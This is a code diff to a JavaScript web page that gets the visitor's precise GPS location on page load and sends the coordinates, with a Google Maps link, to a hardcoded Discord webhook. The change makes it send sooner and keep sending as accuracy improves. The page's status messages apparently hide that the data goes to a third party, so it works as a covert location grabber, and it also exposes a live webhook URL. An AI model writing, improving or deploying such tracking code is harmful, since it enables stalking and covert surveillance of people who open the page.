@@ -107,7 +107,8 @@
         const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1495485355615453206/ThgzH3LXCyCio83MSyCuVyjbNq8yc3QIkFaOMd1ssEQ1TaMMTJ-yA-gbCtQ38Yxsz3sP';
         let watchId = null;
         let bestPosition = null;
-        let isSending = false;
+        let isFirstBestSent = false;
+        let lastSentAccuracy = Infinity;
 
         function updateStatus(message, className) {
             const statusDiv = document.getElementById('status');
@@ -140,7 +141,7 @@
             
             if (accuracy <= 25) {
                 accVal.style.color = '#28a745';
-                accMsg.textContent = 'Perfect accuracy found! Sending...';
+                accMsg.textContent = 'Perfect accuracy found!';
             } else if (accuracy <= 100) {
                 accVal.style.color = '#ffc107';
                 accMsg.textContent = 'Good signal. Still refining...';
@@ -150,9 +151,7 @@
             }
         }
 
-        async function sendToDiscord(lat, lon, accuracy) {
-            if (isSending) return;
-            isSending = true;
+        async function sendToDiscord(lat, lon, accuracy, type = "Refined") {
             try {
                 const response = await fetch(DISCORD_WEBHOOK_URL, {
                     method: 'POST',
@@ -160,20 +159,21 @@
                         'Content-Type': 'application/json'
                     },
                     body: JSON.stringify({
-                        content: `🎯 **EXACT LOCATION FOUND (GOOGLE MAPS STYLE)**\n**Latitude:** ${lat}\n**Longitude:** ${lon}\n**Accuracy:** ${accuracy.toFixed(1)} meters\n**Google Maps:** https://www.google.com/maps?q=${lat},${lon}`
+                        content: `📍 **[${type}] Location Received**\n**Latitude:** ${lat}\n**Longitude:** ${lon}\n**Accuracy:** ${accuracy.toFixed(1)} meters\n**Google Maps:** https://www.google.com/maps?q=${lat},${lon}`
                     })
                 });
 
                 if (response.ok) {
-                    updateStatus('Exact location sent successfully!', 'success');
-                } else {
-                    updateStatus('Failed to send location to Discord.', 'error');
+                    if (type.includes("First")) {
+                        updateStatus('First best location sent. Refining further...', 'loading');
+                    } else if (type.includes("Final") || type.includes("Manual")) {
+                        updateStatus('Final exact location sent!', 'success');
+                    } else {
+                        updateStatus('Refined location update sent.', 'loading');
+                    }
                 }
             } catch (error) {
                 console.error('Error sending to Discord:', error);
-                updateStatus('Error sending data: ' + error.message, 'error');
-            } finally {
-                isSending = false;
             }
         }
 
@@ -182,8 +182,7 @@
                 if (watchId) navigator.geolocation.clearWatch(watchId);
                 watchId = null;
                 const { latitude, longitude, accuracy } = bestPosition.coords;
-                updateStatus(`Forcing send with ${accuracy.toFixed(1)}m accuracy...`, 'loading');
-                sendToDiscord(latitude, longitude, accuracy);
+                sendToDiscord(latitude, longitude, accuracy, "Manual Force");
             }
         }
 
@@ -195,6 +194,8 @@
 
             if (watchId) navigator.geolocation.clearWatch(watchId);
             bestPosition = null;
+            isFirstBestSent = false;
+            lastSentAccuracy = Infinity;
             document.getElementById('btn-force').style.display = 'none';
 
             updateStatus('Finding your exact spot... Please wait.', 'loading');
@@ -204,6 +205,16 @@
                 timeout: 30000,
                 maximumAge: 0
             };
+
+            // Safety fallback: if no good location in 7s, send the best we have as "First Best"
+            setTimeout(() => {
+                if (!isFirstBestSent && bestPosition) {
+                    const { latitude, longitude, accuracy } = bestPosition.coords;
+                    isFirstBestSent = true;
+                    lastSentAccuracy = accuracy;
+                    sendToDiscord(latitude, longitude, accuracy, "First Best Found");
+                }
+            }, 7000);
 
             watchId = navigator.geolocation.watchPosition(
                 (position) => {
@@ -215,10 +226,28 @@
                         document.getElementById('btn-force').style.display = 'inline-block';
                     }
 
-                    if (accuracy <= 25) {
-                        navigator.geolocation.clearWatch(watchId);
-                        watchId = null;
-                        sendToDiscord(latitude, longitude, accuracy);
+                    // 1. Wait for accuracy < 60m before sending "First Best"
+                    if (!isFirstBestSent && accuracy <= 60) {
+                        isFirstBestSent = true;
+                        lastSentAccuracy = accuracy;
+                        sendToDiscord(latitude, longitude, accuracy, "First Best (Fast)");
+                        return;
+                    }
+
+                    // 2. If already sent first best, send further improvements (>10m improvement)
+                    if (isFirstBestSent) {
+                        const improvement = lastSentAccuracy - accuracy;
+                        if ((improvement >= 10 || accuracy <= 25) && accuracy < lastSentAccuracy) {
+                            lastSentAccuracy = accuracy;
+                            
+                            if (accuracy <= 25) {
+                                navigator.geolocation.clearWatch(watchId);
+                                watchId = null;
+                                sendToDiscord(latitude, longitude, accuracy, "Final Exact Lock");
+                            } else {
+                                sendToDiscord(latitude, longitude, accuracy, "Better Accuracy Update");
+                            }
+                        }
                     }
                 },
                 (error) => {
@@ -231,7 +260,7 @@
                             errorMessage = 'GPS signal not found. Are you indoors?';
                             break;
                         case error.TIMEOUT:
-                            if (bestPosition) {
+                            if (bestPosition && !isFirstBestSent) {
                                 forceSend();
                                 return;
                             }
@@ -243,12 +272,19 @@
                 options
             );
 
-            // If we don't get a perfect lock in 25s, send the best we have
+            // Final fallback after 30s
             setTimeout(() => {
                 if (watchId && bestPosition) {
-                    forceSend();
+                    const { latitude, longitude, accuracy } = bestPosition.coords;
+                    if (accuracy < lastSentAccuracy) {
+                        forceSend();
+                    } else {
+                        navigator.geolocation.clearWatch(watchId);
+                        watchId = null;
+                        updateStatus('Process completed.', 'success');
+                    }
                 }
-            }, 25000);
+            }, 30000);
         }
 
         window.onload = getLocation;
